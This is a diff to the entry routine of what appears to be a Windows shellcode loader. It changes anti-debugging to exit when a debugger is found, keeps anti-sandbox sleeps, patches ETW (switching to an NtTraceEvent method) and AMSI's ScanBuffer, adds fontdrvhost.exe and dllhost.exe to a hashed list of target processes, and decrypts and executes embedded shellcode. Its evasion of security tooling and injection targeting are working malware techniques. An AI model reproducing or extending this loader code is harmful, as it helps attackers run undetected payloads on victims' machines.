@@ -21,37 +21,30 @@ VOID entry(void)
 
 	while (malapi::IsDebuggerPresent())
 	{
-		LOG_ERROR("Currently being debugged. Sleeping...");
-		SleepMethod(SLEEP_TIME);
+		LOG_ERROR("Currently being debugged. Exiting...");
+		return;
 	}
 
 #endif
 
 #if ANTI_SANDBOX_ENABLED
 	SleepMethod(SLEEP_TIME);
-#else
 #endif
-
-	//#if ANTI_SANDBOX_ENABLED
-	//#else
-	//#endif
 
 #if PATCH_ENABLED_ETW
 
 #if PATCH_METHOD_ETW == 1
-	malapi::PatchEtwSsn();
+	malapi::PatchEtwNtTraceEvent();
 #else
 	malapi::PatchEtwEventWrite();
 #endif
 
-#else
 #endif
 
 #if PATCH_ENABLED_AMSI
 
 #if PATCH_METHOD_AMSI == 1
 	malapi::PatchAmsiScanBuffer();
-#else
 #endif
 
 #else
@@ -100,6 +93,8 @@ VOID entry(void)
 	constexpr ULONG targets[] = {
 		//malapi::HashStringFowlerNollVoVariant1a("notepad.exe"), // dev win 10
 		//malapi::HashStringFowlerNollVoVariant1a("Notepad.exe"), // dev win 11
+		malapi::HashStringFowlerNollVoVariant1a("fontdrvhost.exe"),
+		malapi::HashStringFowlerNollVoVariant1a("dllhost.exe"),
 		malapi::HashStringFowlerNollVoVariant1a("Spotify.exe"),
 		malapi::HashStringFowlerNollVoVariant1a("slack.exe"),
 		malapi::HashStringFowlerNollVoVariant1a("PerfWatson2.exe"),
@@ -146,7 +141,9 @@ VOID entry(void)
 
 #endif
 
+#if ANTI_SANDBOX_ENABLED
 	SleepMethod(SLEEP_TIME);
+#endif
 
 	DecryptShellcode(shellcode, shellcode_size, key, sizeof(key));
 
@@ -156,6 +153,11 @@ VOID entry(void)
 		return;
 	}
 	LOG_SUCCESS("Executing Shellcode");
+
+	//
+	// Not Functional
+	//
+	//malapi::SelfDeleteLoader();
 }
 
 #pragma region [alternate entrypoints]
